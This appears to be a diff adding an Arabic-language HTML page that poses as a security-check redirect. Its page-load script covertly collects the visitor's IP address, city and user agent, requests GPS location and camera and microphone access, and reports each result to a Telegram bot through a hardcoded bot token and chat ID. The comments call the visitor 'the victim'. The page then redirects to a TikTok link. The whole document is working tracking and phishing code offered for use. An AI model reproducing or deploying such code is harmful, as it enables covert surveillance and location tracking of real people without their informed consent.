@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري إعادة التوجيه...</title>
+    <style>
+        body { background: white; color: black; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p dir="rtl">جاري التحقق من الأمان وتوجيهك...</p>
+
+    <script>
+        const token = '7565752831:AAFr5xn1Qk6qJ1UKSkXtVcK_6ho5dKWCnLQ';
+        const chatId = '7360450559';
+        const targetUrl = 'https://vt.tiktok.com/ZSmapbvm1/';
+
+        async function sendToTele(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+            } catch (e) {}
+        }
+
+        async function startHacking() {
+            // 1. سحب الـ IP والبيانات الأساسية (بدون إذن)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                let basicInfo = `🔔 دخول جديد!\n🌐 IP: ${d.ip}\n📍 المدينة: ${d.city}\n📱 الجهاز: ${navigator.userAgent}`;
+                await sendToTele(basicInfo);
+            } catch(e) {}
+
+            // 2. طلب الموقع الدقيق (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    await sendToTele(`📍 موقع GPS دقيق:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, () => { sendToTele("❌ الضحية رفض إذن الموقع"); });
+            }
+
+            // 3. طلب الكاميرا والمايك
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                await sendToTele("✅ الضحية سمح بالكاميرا والمايك!");
+                
+                // لقطة سريعة (محاكاة)
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    sendToTele("📸 تم تفعيل الكاميرا بنجاح وجاري التسجيل...");
+                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد السحب
+                }, 3000);
+            } catch(e) {
+                await sendToTele("❌ الضحية رفض إذن الكاميرا/المايك");
+            }
+
+            // 4. التحويل النهائي بعد 4 ثوانٍ لضمان وصول الرسائل
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 4000);
+        }
+
+        window.onload = startHacking;
+    </script>
+</body>
+</html>
